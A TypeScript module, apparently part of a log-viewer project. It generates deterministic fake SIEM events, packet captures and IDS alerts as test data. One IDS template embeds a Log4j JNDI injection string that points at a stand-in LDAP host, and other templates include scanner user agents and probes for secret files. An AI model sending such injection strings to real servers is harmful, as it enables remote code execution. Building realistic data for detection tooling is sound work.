/**
 * SIEM 스타일 가짜 로그 이벤트 생성기 (시드 고정 → 매번 같은 데이터).
 * mock-server(Node type stripping) 와 playground(Vite) 양쪽에서 사용한다.
 */

export interface MockEvent {
  _time: string
  event_id: string
  host: string
  source: string
  sourcetype: string
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  action: string
  user: string
  src_ip: string
  dest_ip: string
  dest_port: number
  bytes: number
  message: string
  geo: { country: string; city: string }
  /** 원본 payload (HTTP 요청, Windows XML, base64 패킷 등) */
  payload?: string
  /** payload 인코딩 (base64 등) */
  payload_encoding?: string
  [key: string]: unknown
}

function mulberry32(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

const HOSTS = ['web-01', 'web-02', 'web-03', 'api-01', 'api-02', 'db-01', 'fw-edge-01', 'dc-01', 'vpn-gw-01', 'mail-01']
const USERS = ['admin', 'root', 'alice', 'bob', 'charlie', 'svc_backup', 'svc_deploy', 'kim.minsu', 'lee.jiwon', 'park.hyun', '-']
const GEO = [
  { country: 'KR', city: 'Seoul' },
  { country: 'KR', city: 'Busan' },
  { country: 'US', city: 'Ashburn' },
  { country: 'CN', city: 'Beijing' },
  { country: 'RU', city: 'Moscow' },
  { country: 'DE', city: 'Frankfurt' },
  { country: 'JP', city: 'Tokyo' },
  { country: 'NL', city: 'Amsterdam' },
]

type Template = {
  weight: number
  source: string
  sourcetype: string
  hosts: string[]
  build: (r: () => number, ctx: { user: string; src: string; dst: string; port: number }) => {
    severity: MockEvent['severity']
    action: string
    message: string
    port?: number
    payload?: string
    payload_encoding?: string
  }
}

const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0 Safari/537.36',
  'curl/8.9.1',
  'python-requests/2.32.3',
  'Nmap Scripting Engine',
  'sqlmap/1.8.5#stable',
]

/** IPv4+TCP 패킷(체크섬 포함) + 애플리케이션 데이터를 base64 로 */
function fakePacket(r: () => number, data: string, src: string, dst: string, dport: number): string {
  const sport = 1024 + Math.floor(r() * 60000)
  const seq = Math.floor(r() * 0xffffffff)
  const ack = Math.floor(r() * 0xffffffff)
  return toB64(ipPacket(r, src, dst, 6, tcpSeg(src, dst, sport, dport, seq, ack, 0x18, strBytes(data))))
}

// ---------------------------------------------------------------- 패킷 빌더 (체크섬 포함)
const strBytes = (s: string) => Uint8Array.from(s, (ch) => ch.charCodeAt(0) & 0xff)
const ipBytes = (a: string) => a.split('.').map(Number)
const toB64 = (b: Uint8Array) => btoa(String.fromCharCode(...b))

function csum(b: number[] | Uint8Array, init = 0): number {
  let s = init
  for (let i = 0; i < b.length; i += 2) s += (b[i] << 8) | (b[i + 1] ?? 0)
  while (s >> 16) s = (s & 0xffff) + (s >> 16)
  return ~s & 0xffff
}
function pseudo(src: string, dst: string, proto: number, len: number): number {
  const a = [...ipBytes(src), ...ipBytes(dst)]
  let s = proto + len
  for (let i = 0; i < 8; i += 2) s += (a[i] << 8) | a[i + 1]
  return s
}
function ipPacket(r: () => number, src: string, dst: string, proto: number, l4: Uint8Array): Uint8Array {
  const total = 20 + l4.length
  const id = Math.floor(r() * 0xffff)
  const h = [0x45, 0, total >> 8, total & 0xff, id >> 8, id & 0xff, 0x40, 0, 64, proto, 0, 0, ...ipBytes(src), ...ipBytes(dst)]
  const c = csum(h)
  h[10] = c >> 8
  h[11] = c & 0xff
  const out = new Uint8Array(total)
  out.set(h)
  out.set(l4, 20)
  return out
}
function tcpSeg(src: string, dst: string, sp: number, dp: number, seq: number, ack: number, flags: number, data: Uint8Array): Uint8Array {
  const out = new Uint8Array(20 + data.length)
  const dv = new DataView(out.buffer)
  dv.setUint16(0, sp)
  dv.setUint16(2, dp)
  dv.setUint32(4, seq >>> 0)
  dv.setUint32(8, flags & 0x10 ? ack >>> 0 : 0)
  out[12] = 5 << 4
  out[13] = flags
  dv.setUint16(14, 64240)
  out.set(data, 20)
  dv.setUint16(16, csum(out, pseudo(src, dst, 6, out.length)))
  return out
}
function udpDgram(src: string, dst: string, sp: number, dp: number, data: Uint8Array): Uint8Array {
  const out = new Uint8Array(8 + data.length)
  const dv = new DataView(out.buffer)
  dv.setUint16(0, sp)
  dv.setUint16(2, dp)
  dv.setUint16(4, out.length)
  out.set(data, 8)
  dv.setUint16(6, csum(out, pseudo(src, dst, 17, out.length)) || 0xffff)
  return out
}
function ether(dstMac: number[], srcMac: number[], payload: Uint8Array): Uint8Array {
  const out = new Uint8Array(14 + payload.length)
  out.set(dstMac)
  out.set(srcMac, 6)
  out[12] = 0x08
  out.set(payload, 14)
  return out
}
function dnsMsg(id: number, name: string, answer?: string): Uint8Array {
  const q: number[] = []
  for (const label of name.split('.')) q.push(label.length, ...strBytes(label))
  q.push(0, 0, 1, 0, 1)
  const h = [id >> 8, id & 0xff, answer ? 0x81 : 0x01, answer ? 0x80 : 0x00, 0, 1, 0, answer ? 1 : 0, 0, 0, 0, 0]
  const a = answer ? [0xc0, 0x0c, 0, 1, 0, 1, 0, 0, 0x0e, 0x10, 0, 4, ...ipBytes(answer)] : []
  return Uint8Array.from([...h, ...q, ...a])
}
/** libpcap 파일 (LINKTYPE_ETHERNET) */
function pcapFile(frames: { ts: number; data: Uint8Array }[]): Uint8Array {
  const total = 24 + frames.reduce((a, f) => a + 16 + f.data.length, 0)
  const out = new Uint8Array(total)
  const dv = new DataView(out.buffer)
  dv.setUint32(0, 0xa1b2c3d4, true)
  dv.setUint16(4, 2, true)
  dv.setUint16(6, 4, true)
  dv.setUint32(16, 65535, true)
  dv.setUint32(20, 1, true)
  let off = 24
  for (const f of frames) {
    const sec = Math.floor(f.ts)
    dv.setUint32(off, sec, true)
    dv.setUint32(off + 4, Math.round((f.ts - sec) * 1e6), true)
    dv.setUint32(off + 8, f.data.length, true)
    dv.setUint32(off + 12, f.data.length, true)
    out.set(f.data, off + 16)
    off += 16 + f.data.length
  }
  return out
}

/** DNS 조회 → TCP 3-way handshake → HTTP 요청/응답 → FIN 으로 이어지는 짧은 세션 캡처 */
function fakeSession(r: () => number, src: string, dst: string, host: string, path: string, status: number, t0: number): string {
  const cMac = [0x00, 0x1c, 0x42, 0x10, Math.floor(r() * 256), Math.floor(r() * 256)]
  const gMac = [0x00, 0x0c, 0x29, 0xaa, 0x01, 0x01]
  const dnsSrv = '10.0.0.53'
  const dnsId = Math.floor(r() * 0xffff)
  const dnsPort = 50000 + (dnsId % 10000)
  const sp = 40000 + Math.floor(r() * 20000)
  let cs = Math.floor(r() * 0xfffffff)
  let ss = Math.floor(r() * 0xfffffff)
  let t = t0
  const frames: { ts: number; data: Uint8Array }[] = []
  const tick = (ms: number) => (t += ms / 1000 + r() / 1000)
  const up = (to: string, proto: number, l4: Uint8Array) => frames.push({ ts: tick(1), data: ether(gMac, cMac, ipPacket(r, src, to, proto, l4)) })
  const down = (from: string, proto: number, l4: Uint8Array) => frames.push({ ts: tick(8), data: ether(cMac, gMac, ipPacket(r, from, src, proto, l4)) })
  const none = new Uint8Array(0)
  up(dnsSrv, 17, udpDgram(src, dnsSrv, dnsPort, 53, dnsMsg(dnsId, host)))
  down(dnsSrv, 17, udpDgram(dnsSrv, src, 53, dnsPort, dnsMsg(dnsId, host, dst)))
  up(dst, 6, tcpSeg(src, dst, sp, 80, cs, 0, 0x02, none))
  down(dst, 6, tcpSeg(dst, src, 80, sp, ss, cs + 1, 0x12, none))
  cs++
  ss++
  up(dst, 6, tcpSeg(src, dst, sp, 80, cs, ss, 0x10, none))
  const req = strBytes(`GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: curl/8.9.1\r\nAccept: */*\r\n\r\n`)
  up(dst, 6, tcpSeg(src, dst, sp, 80, cs, ss, 0x18, req))
  cs += req.length
  const body = status === 200 ? '{"ok":true}' : '{"error":"not found"}'
  const res = strBytes(
    `HTTP/1.1 ${status} ${status === 200 ? 'OK' : 'Not Found'}\r\nContent-Type: application/json\r\nContent-Length: ${body.length}\r\n\r\n${body}`,
  )
  down(dst, 6, tcpSeg(dst, src, 80, sp, ss, cs, 0x18, res))
  ss += res.length
  up(dst, 6, tcpSeg(src, dst, sp, 80, cs, ss, 0x11, none))
  down(dst, 6, tcpSeg(dst, src, 80, sp, ss, cs + 1, 0x11, none))
  up(dst, 6, tcpSeg(src, dst, sp, 80, cs + 1, ss + 1, 0x10, none))
  return toB64(pcapFile(frames))
}

const pick = <T>(r: () => number, arr: readonly T[]): T => arr[Math.floor(r() * arr.length)]

const TEMPLATES: Template[] = [
  {
    weight: 30,
    source: '/var/log/nginx/access.log',
    sourcetype: 'nginx:access',
    hosts: ['web-01', 'web-02', 'web-03'],
    build: (r, c) => {
      const status = pick(r, [200, 200, 200, 200, 301, 304, 403, 404, 404, 500, 502])
      const path = pick(r, ['/', '/login', '/api/v1/users', '/api/v1/orders', '/admin', '/wp-login.php', '/.env', '/static/app.js'])
      const method = pick(r, ['GET', 'GET', 'GET', 'POST', 'PUT', 'DELETE'])
      const ua = pick(r, UAS)
      const bytes = Math.floor(r() * 50000)
      const payload =
        method === 'GET' || method === 'DELETE'
          ? `${method} ${path} HTTP/1.1\r\nHost: shop.example.com\r\nUser-Agent: ${ua}\r\nAccept: */*\r\nX-Forwarded-For: ${c.src}\r\n\r\n`
          : JSON.stringify({
              request: {
                method,
                path,
                headers: { host: 'shop.example.com', 'user-agent': ua, 'content-type': 'application/json' },
                body: path === '/login' ? { username: c.user, password: '********' } : { id: Math.floor(r() * 10000), qty: 1 + Math.floor(r() * 5) },
              },
              response: { status, bytes },
            })
      return {
        severity: status >= 500 ? 'high' : status >= 400 ? 'low' : 'info',
        action: status < 400 ? 'allowed' : 'error',
        message: `${c.src} - ${c.user} "${method} ${path} HTTP/1.1" ${status} ${bytes}`,
        port: 443,
        payload,
      }
    },
  },
  {
    weight: 20,
    source: '/var/log/secure',
    sourcetype: 'linux_secure',
    hosts: ['web-01', 'api-01', 'api-02', 'db-01'],
    build: (r, c) => {
      const ok = r() > 0.35
      return {
        severity: ok ? 'info' : r() > 0.7 ? 'high' : 'medium',
        action: ok ? 'success' : 'failure',
        message: ok
          ? `sshd[${1000 + Math.floor(r() * 9000)}]: Accepted publickey for ${c.user} from ${c.src} port ${c.port} ssh2`
          : `sshd[${1000 + Math.floor(r() * 9000)}]: Failed password for invalid user ${c.user} from ${c.src} port ${c.port} ssh2`,
        port: 22,
      }
    },
  },
  {
    weight: 25,
    source: 'firewall',
    sourcetype: 'pan:traffic',
    hosts: ['fw-edge-01'],
    build: (r, c) => {
      const blocked = r() > 0.6
      const app = pick(r, ['ssl', 'web-browsing', 'dns', 'ssh', 'rdp', 'smb', 'unknown-tcp'])
      return {
        severity: blocked ? pick(r, ['medium', 'high', 'low'] as const) : 'info',
        action: blocked ? 'blocked' : 'allowed',
        message: `TRAFFIC ${blocked ? 'deny' : 'allow'} app=${app} ${c.src} -> ${c.dst}:${c.port} rule=${blocked ? 'deny-inbound' : 'allow-outbound'}`,
      }
    },
  },
  {
    weight: 15,
    source: 'WinEventLog:Security',
    sourcetype: 'wineventlog',
    hosts: ['dc-01'],
    build: (r, c) => {
      const code = pick(r, [4624, 4624, 4625, 4625, 4672, 4720, 4740, 1102])
      const map: Record<number, [MockEvent['severity'], string, string]> = {
        4624: ['info', 'success', 'An account was successfully logged on'],
        4625: ['medium', 'failure', 'An account failed to log on'],
        4672: ['low', 'success', 'Special privileges assigned to new logon'],
        4720: ['high', 'success', 'A user account was created'],
        4740: ['high', 'locked', 'A user account was locked out'],
        1102: ['critical', 'cleared', 'The audit log was cleared'],
      }
      const [severity, action, text] = map[code]
      const payload = [
        '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">',
        '  <System>',
        '    <Provider Name="Microsoft-Windows-Security-Auditing" />',
        `    <EventID>${code}</EventID>`,
        '    <Channel>Security</Channel>',
        '    <Computer>dc-01.corp.local</Computer>',
        '  </System>',
        '  <EventData>',
        `    <Data Name="TargetUserName">${c.user}</Data>`,
        '    <Data Name="TargetDomainName">CORP</Data>',
        `    <Data Name="LogonType">${pick(r, [2, 3, 10])}</Data>`,
        `    <Data Name="IpAddress">${c.src}</Data>`,
        '  </EventData>',
        '</Event>',
      ].join('\n')
      return {
        severity,
        action,
        message: `EventCode=${code} ${text}. Account Name: ${c.user} Source Network Address: ${c.src}`,
        port: 445,
        payload,
      }
    },
  },
  {
    weight: 10,
    source: 'ids',
    sourcetype: 'suricata:alert',
    hosts: ['fw-edge-01', 'vpn-gw-01'],
    build: (r, c) => {
      const sig = pick(r, [
        ['critical', 'ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)'],
        ['high', 'ET SCAN Nmap Scripting Engine User-Agent Detected'],
        ['high', 'ET MALWARE Possible Cobalt Strike Beacon'],
        ['medium', 'ET POLICY SSH session in progress on Unusual Port'],
        ['critical', 'ET TROJAN Known Ransomware C2 Domain Lookup'],
        ['low', 'ET INFO Observed DNS Query to .xyz TLD'],
      ] as const)
      const data = sig[1].includes('Log4j')
        ? 'GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: ${jndi:ldap://203.0.113.7:1389/a}\r\n\r\n'
        : sig[1].includes('Nmap')
          ? 'GET /nmaplowercheck HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)\r\n\r\n'
          : `\x17\x03\x03${String.fromCharCode(...Array.from({ length: 48 }, () => Math.floor(r() * 256)))}`
      return {
        severity: sig[0],
        action: r() > 0.5 ? 'blocked' : 'alerted',
        message: `[1:${2000000 + Math.floor(r() * 99999)}:1] ${sig[1]} {TCP} ${c.src} -> ${c.dst}:${c.port}`,
        payload: fakePacket(r, data, c.src, c.dst, sig[1].includes('SSH') ? 2222 : sig[1].includes('HTTP') || data.startsWith('GET') ? 80 : 443),
        payload_encoding: 'base64',
      }
    },
  },
  {
    weight: 5,
    source: 'stream:pcap',
    sourcetype: 'pcap',
    hosts: ['tap-01', 'fw-edge-01'],
    build: (r, c) => {
      const host = pick(r, ['shop.example.com', 'api.example.net', 'cdn.example.org', 'update.example.xyz'])
      const path = pick(r, ['/', '/api/v1/status', '/download/agent.bin', '/.git/config'])
      const status = path === '/.git/config' ? 404 : 200
      return {
        severity: path === '/.git/config' || host.endsWith('.xyz') ? 'medium' : 'info',
        action: 'captured',
        message: `pcap ${c.src} -> ${host}(${c.dst}):80 GET ${path} ${status} (10 packets)`,
        port: 80,
        payload: fakeSession(r, c.src, c.dst, host, path, status, 1_760_000_000 + Math.floor(r() * 1e7)),
        payload_encoding: 'base64',
      }
    },
  },
]

const totalWeight = TEMPLATES.reduce((a, t) => a + t.weight, 0)

function ip(r: () => number, internal: boolean): string {
  if (internal) return `10.${Math.floor(r() * 4)}.${Math.floor(r() * 255)}.${1 + Math.floor(r() * 254)}`
  return `${1 + Math.floor(r() * 223)}.${Math.floor(r() * 255)}.${Math.floor(r() * 255)}.${1 + Math.floor(r() * 254)}`
}

/**
 * @param count 이벤트 수
 * @param endTime 가장 최근 이벤트 시각 (ms)
 * @param spanMs 전체 시간 범위 (기본 24h)
 */
export function generateEvents(count: number, endTime = Date.now(), spanMs = 24 * 3600 * 1000, seed = 42): MockEvent[] {
  const r = mulberry32(seed)
  const step = spanMs / Math.max(1, count)
  const out: MockEvent[] = new Array(count)
  for (let i = 0; i < count; i++) {
    let w = r() * totalWeight
    let tpl = TEMPLATES[0]
    for (const t of TEMPLATES) {
      if ((w -= t.weight) < 0) {
        tpl = t
        break
      }
    }
    const inbound = r() > 0.5
    const ctx = {
      user: pick(r, USERS),
      src: ip(r, !inbound),
      dst: ip(r, inbound),
      port: pick(r, [22, 53, 80, 443, 445, 3389, 8080, 8443, 1024 + Math.floor(r() * 60000)]),
    }
    const built = tpl.build(r, ctx)
    const time = endTime - i * step - Math.floor(r() * step)
    out[i] = {
      _time: new Date(time).toISOString(),
      event_id: `evt-${(count - i).toString().padStart(7, '0')}`,
      host: pick(r, tpl.hosts.length ? tpl.hosts : HOSTS),
      source: tpl.source,
      sourcetype: tpl.sourcetype,
      severity: built.severity,
      action: built.action,
      user: ctx.user,
      src_ip: ctx.src,
      dest_ip: ctx.dst,
      dest_port: built.port ?? ctx.port,
      bytes: Math.floor(r() * 200000),
      message: built.message,
      geo: pick(r, GEO),
    }
    if (built.payload) out[i].payload = built.payload
    if (built.payload_encoding) out[i].payload_encoding = built.payload_encoding
  }
  return out
}
